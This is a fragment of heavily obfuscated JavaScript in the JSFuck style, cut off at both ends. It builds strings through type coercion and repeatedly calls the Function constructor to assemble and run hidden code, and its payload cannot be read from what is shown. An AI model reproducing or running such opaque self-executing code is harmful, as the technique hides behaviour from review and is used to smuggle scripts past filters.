[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([]+{})[!+[]+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(+[]+[])+(+{}+[])[+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+(+{}+[])[+!![]]+(!![]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!+[]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+([]+{})[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(+!![]+[])+(+[]+[])+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[+[]]+(+{}+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(